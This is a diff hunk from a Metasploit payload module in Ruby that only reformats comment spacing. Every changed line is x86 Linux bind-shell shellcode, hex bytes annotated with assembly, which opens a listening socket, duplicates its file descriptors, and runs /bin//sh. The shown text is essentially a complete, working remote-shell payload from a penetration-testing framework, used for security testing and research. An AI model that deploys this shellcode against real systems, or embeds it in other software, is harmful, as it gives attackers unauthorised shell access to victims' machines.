@@ -25,37 +25,37 @@ module MetasploitModule
       'Payload'       =>
         {
           'Payload' =>
-            "\x31\xdb"              +#  xor    %ebx,%ebx
-            "\xf7\xe3"              +#  mul    %ebx
-            "\xb0\x66"              +#  mov    $0x66,%al
-            "\x43"                  +#  inc    %ebx
-            "\x52"                  +#  push   %edx
-            "\x53"                  +#  push   %ebx
-            "\x6a\x02"              +#  push   $0x2
-            "\x89\xe1"              +#  mov    %esp,%ecx
-            "\xcd\x80"              +#  int    $0x80
-            "\x52"                  +#  push   %edx
-            "\x50"                  +#  push   %eax
-            "\x89\xe1"              +#  mov    %esp,%ecx
-            "\xb0\x66"              +#  mov    $0x66,%al
-            "\xb3\x04"              +#  mov    $0x4,%bl
-            "\xcd\x80"              +#  int    $0x80
-            "\xb0\x66"              +#  mov    $0x66,%al
-            "\x43"                  +#  inc    %ebx
-            "\xcd\x80"              +#  int    $0x80
-            "\x59"                  +#  pop    %ecx
-            "\x93"                  +#  xchg   %eax,%ebx
-            "\x6a\x3f"              +#  push   $0x3f
-            "\x58"                  +#  pop    %eax
-            "\xcd\x80"              +#  int    $0x80
-            "\x49"                  +#  dec    %ecx
-            "\x79\xf8"              +#  jns    20
-            "\xb0\x0b"              +#  mov    $0xb,%al
-            "\x68\x2f\x2f\x73\x68"  +#  push   $0x68732f2f
-            "\x68\x2f\x62\x69\x6e"  +#  push   $0x6e69622f
-            "\x89\xe3"              +#  mov    %esp,%ebx
-            "\x41"                  +#  inc    %ecx
-            "\xcd\x80"               #  int    $0x80
+            "\x31\xdb"              + #  xor    %ebx,%ebx
+            "\xf7\xe3"              + #  mul    %ebx
+            "\xb0\x66"              + #  mov    $0x66,%al
+            "\x43"                  + #  inc    %ebx
+            "\x52"                  + #  push   %edx
+            "\x53"                  + #  push   %ebx
+            "\x6a\x02"              + #  push   $0x2
+            "\x89\xe1"              + #  mov    %esp,%ecx
+            "\xcd\x80"              + #  int    $0x80
+            "\x52"                  + #  push   %edx
+            "\x50"                  + #  push   %eax
+            "\x89\xe1"              + #  mov    %esp,%ecx
+            "\xb0\x66"              + #  mov    $0x66,%al
+            "\xb3\x04"              + #  mov    $0x4,%bl
+            "\xcd\x80"              + #  int    $0x80
+            "\xb0\x66"              + #  mov    $0x66,%al
+            "\x43"                  + #  inc    %ebx
+            "\xcd\x80"              + #  int    $0x80
+            "\x59"                  + #  pop    %ecx
+            "\x93"                  + #  xchg   %eax,%ebx
+            "\x6a\x3f"              + #  push   $0x3f
+            "\x58"                  + #  pop    %eax
+            "\xcd\x80"              + #  int    $0x80
+            "\x49"                  + #  dec    %ecx
+            "\x79\xf8"              + #  jns    20
+            "\xb0\x0b"              + #  mov    $0xb,%al
+            "\x68\x2f\x2f\x73\x68"  + #  push   $0x68732f2f
+            "\x68\x2f\x62\x69\x6e"  + #  push   $0x6e69622f
+            "\x89\xe3"              + #  mov    %esp,%ebx
+            "\x41"                  + #  inc    %ecx
+            "\xcd\x80"                #  int    $0x80
         }
       ))
   end
